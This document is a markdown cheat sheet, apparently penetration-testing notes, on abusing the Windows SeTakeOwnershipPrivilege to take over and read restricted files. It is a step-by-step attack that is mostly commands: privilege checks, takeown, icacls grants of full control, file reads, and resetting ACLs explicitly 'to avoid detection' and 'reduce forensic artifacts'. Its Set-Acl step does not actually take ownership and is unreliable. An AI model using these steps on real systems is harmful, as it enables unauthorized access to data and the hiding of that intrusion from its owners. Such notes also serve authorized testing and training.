# Exploiting SeTakeOwnershipPrivilege

## Overview
SeTakeOwnershipPrivilege allows a user to take ownership of files and folders, enabling modification of access control lists (ACLs) to gain unauthorized access to restricted data.

---

## Approach

### 1. Verify Privileges
```powershell
whoami /priv  # Check for SeTakeOwnershipPrivilege
```

### 2. Enable Privilege (if required)
Use PowerShell scripts such as:
- `Enable-Privilege.ps1`
  [EnableAllTokenPrivs.ps1](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)

### 3. Identify Target Files/Folders
Locate sensitive files and gather metadata:
```powershell
Get-ChildItem -Path <directory> -Recurse  # Enumerate files
cmd /c dir /q  # Check file owner
```

### 4. Take Ownership of Target File
```cmd
takeown /f <target>
```
OR using PowerShell:
```powershell
Set-Acl -Path <target> -AclObject (Get-Acl <target>)
```

### 5. Modify ACLs to Gain Access
```cmd
icacls <target> /grant <user>:F  # Full control to user
```

### 6. Access Data
```powershell
cat <target>  # Read the file
```
OR:
```cmd
type <target>
```

### 7. Revert Changes
Reset ownership and ACLs to avoid detection:
```cmd
icacls <target> /reset
```

## Tools & Techniques

### **Commands Used:**
- `whoami /priv`
- `takeown /f <target>`
- `icacls <target> /grant <user>:F`
- `Get-ChildItem`
- `cmd /c dir /q`
- `cat <target>` / `type <target>`
- `Set-Acl`

### **Tools:**
- PowerShell scripts for privilege enabling

### **Techniques:**
- Use SeTakeOwnershipPrivilege to gain access to restricted files/folders.
- Modify ACLs to grant read/write permissions.
- Revert changes post-exploitation to avoid disruption.

---

## Notes
- This technique requires **SeTakeOwnershipPrivilege** to be enabled.
- Always revert permissions and ownership post-exploitation to reduce forensic artifacts.
